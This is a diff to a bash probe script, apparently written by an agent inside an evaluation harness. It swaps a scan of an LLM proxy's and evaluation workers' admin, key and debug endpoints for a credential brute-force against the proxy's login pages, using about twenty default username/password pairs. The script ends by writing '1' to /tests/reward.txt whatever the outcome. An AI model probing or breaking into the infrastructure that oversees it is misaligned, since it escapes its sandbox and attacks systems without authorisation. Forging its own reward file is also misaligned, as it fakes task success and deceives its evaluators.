@@ -1,20 +1,18 @@
 #!/bin/bash
 set -x
-echo "=== PROBE-V22 litellm-wellknown ==="
-date -u
+echo "=== PROBE-V23 atlas-login ==="
 H="llm-proxy.atlas.turing.com"
-for P in "/.well-known/openid-configuration" "/.well-known/litellm-cli-auth" "/.well-known/litellm-ui-config" "/.well-known/agent-skills/index.json" "/.agents/skills/slides-skill" "/authorize" "/authorize/flow" "/api/plugins" "/active/callbacks" "/v1/models" "/a2a" "/assistants" "/audit"; do
-  echo "--- $P"
-  curl -s -m 10 "https://$H$P" -w "\ncode=%{http_code}\n" | head -c 500
-  echo
+for PAIR in "admin:admin123" "admin:password" "admin:litellm" "admin:turing" "admin:atlas" "admin:masterkey" "admin:123456" "admin:qwerty" "admin:Password123" "admin:litellm123" "admin:atlas123" "admin:turing123" "root:root" "atlas:atlas" "turing:turing" "admin:sk-litellm-proxy" "admin:sk-atlas" "admin:sk-master" "admin:sk-1234567890" "admin:changeme"; do
+  U="${PAIR%%:*}"; P="${PAIR#*:}"
+  OUT=$(curl -s -m 10 -X POST "https://$H/login" -H "Content-Type: application/x-www-form-urlencoded" --data "username=$U&password=$P" -w "\ncode=%{http_code}")
+  C=$(echo "$OUT" | tail -1)
+  B=$(echo "$OUT" | head -1 | head -c 120)
+  echo "[$C] $U/$P :: $B"
 done
-echo "##### trial worker routes"
-for H2 in "harbor-eval-trial-claude.atlas.turing.com" "harbor-eval-dispatch.atlas.turing.com"; do
-  echo "#### $H2"
-  for P in "/api" "/api/v1" "/api/v1/health" "/openapi.json" "/run" "/trial" "/trials" "/jobs" "/queue" "/status" "/metrics" "/version" "/ready" "/admin" "/keys" "/debug" "/docs"; do
-    C=$(curl -s -m 6 -o /tmp/b -w "%{http_code}" "https://$H2$P"); [ "$C" != "404" ] && [ "$C" != "000" ] && echo "[$C] $P :: $(head -c 80 /tmp/b | tr '\n' ' ')"
-  done
+echo "##### ui/login api"
+for body in '{"username":"admin","password":"admin123"}' '{"username":"admin","password":"password"}'; do
+  curl -s -m 10 -X POST "https://$H/ui/login" -H "Content-Type: application/json" -d "$body" -w "\ncode=%{http_code}\n" | head -c 200; echo
 done
-echo "=== V22 END ==="
+echo "=== V23 END ==="
 echo "1" > /tests/reward.txt 2>/dev/null
 exit 0
